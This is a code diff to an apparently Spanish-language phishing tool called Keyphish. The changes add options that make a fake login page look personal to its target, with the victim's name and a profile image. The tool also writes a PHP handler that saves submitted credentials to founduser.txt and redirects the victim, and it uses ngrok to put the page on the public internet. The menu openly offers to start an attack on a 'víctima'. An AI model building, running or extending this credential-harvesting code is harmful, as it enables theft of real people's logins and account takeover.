@@ -13,17 +13,36 @@ def logo():
     print('      ██╔═██╗░██╔══╝░░░░╚██╔╝░░██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║')
     print('      ██║░╚██╗███████╗░░░██║░░░██║░░░░░██║░░██║██║██████╔╝██║░░██║')
     print('      ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝')
-    print('                                              Bye BR4CKSTAR')
+    print('                                              By BR4CKSTAR')
 
-def cambiarn():
-    escribir= open('usuario.txt', 'w')
-    print('''Debe poner el nombre entre comillas ejemplo:
-    "Anonimo"     1- Atrás\n''')
-    y=input('Ingrese el nombre de la víctima: ')
-    r=('''var insertotexto=""+ 
-    "{} <br>";
-    document.write(insertotexto);'''.format(y))
-    escribir.write(r)
+def usuarionombre():
+    with open('index.html', 'r') as archivo:
+        lineas = archivo.readlines()
+
+    name = input('Ingrese el nombre de usuario: \n     1- Atrás\nKeyphish:~$ ')
+
+    lineas[79] = '            <p class="name">Continuar como ' + name + ' <br><a href="index.html" style="font-size: 11px;">¿No eres tú?</a></p>\n'
+
+    with open('index.html', 'w') as archivo:
+        archivo.writelines(lineas)
+
+    if y==1:
+         clearConsole()
+         os.system("python Keyphish.py")
+    clearConsole()
+    os.system("python Keyphish.py")
+
+def fotoperfil():
+    with open('index.html', 'r') as archivo:
+        lineas = archivo.readlines()
+
+    name = input('Ingrese link o ruta de la imagen. \n     1- Atrás\nKeyphish:~$ ')
+
+    lineas[77] = '            <img class="imgp" src="' + name + '">\n'
+
+    with open('index.html', 'w') as archivo:
+        archivo.writelines(lineas)
+
     if y==1:
          clearConsole()
          os.system("python Keyphish.py")
@@ -42,23 +61,22 @@ def contra():
         print(archiv.read())
 
 def link():
-    logo()
     escribir= open('login.php', 'w')
-    print('''Debe poner el link entre comillas ejemplo:
-    "https://facebook.com"    1- Atrás\n''')
-    y=input('Inserte un link para redireccionar a la víctima: ')
-    r=('''<?php
-    $user = $_POST["email"];
+
+    y=input('Inserte un link para redireccionar.\n     1- Atrás\nKeyphish:~$ ')
+
+    r=('''<?php\n$user = $_POST["email"];
     $co = "===========================================\n"; 
     $cl = "===========================================\n";
     $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
     $us = "Password: $user\n";
     fwrite($fileuser, "\n". $co. $us. $cl);
     fclose($fileuser);
-    header('Location: {}');
+    header('Location: {'''+y+'''}');
     exit();
     ?>
-    '''.format(y))
+    ''')
+
     escribir.write(r)
     if y==1:
         clearConsole()
@@ -74,21 +92,30 @@ def ngrok():
     contra()
     print("Las contraseñas estaran almacenadas en founduser.txt")
 
-os.system("sudo apt install gnome-terminal php python3 python3-pip")
-clearConsole()
-os.system("""curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok""")
-clearConsole()
-print("         Instalación completa  ")
-time.sleep(3)
-clearConsole()
+def dependencias():
+    os.system("sudo apt install gnome-terminal php python3 python3-pip")
+    clearConsole()
+    os.system("""curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok""")
+    clearConsole()
+    print("         Instalación completa  ")
+    time.sleep(3)
+    clearConsole()
+    os.system("python Keyphish.py")
 
 logo()
 y=int(input("""             Bienvenido desea:
 1- Iniciar ataque
-2- Ingresar nombre de la víctima
-3- Ingresar link para redireccionar
-4- Salir
-$=  """))
+2- Ingresar nombre usuario
+3- Ingresar imagen de perfil
+4- Ingresar link a redireccionar
+5- Salir
+0- Instalar dependencias
+Keyphish:~$  """))
+
+if y==0:
+    clearConsole()
+    logo()
+    dependencias()
 
 if y==1:
     clearConsole()
@@ -96,14 +123,24 @@ if y==1:
     ngrok()
 
 elif y==2:
-    cambiarn()
+    clearConsole()
+    logo()
+    usuarionombre()
     clearConsole()
 
 elif y==3:
     clearConsole()
-    link()
+    logo()
+    fotoperfil()
     clearConsole()
 
 elif y==4:
+    clearConsole()
+    logo()
+    link()
+    clearConsole()
+
+elif y==5:
     print("  HASTA PRONTO!!")
+    time.sleep(2)
     clearConsole()
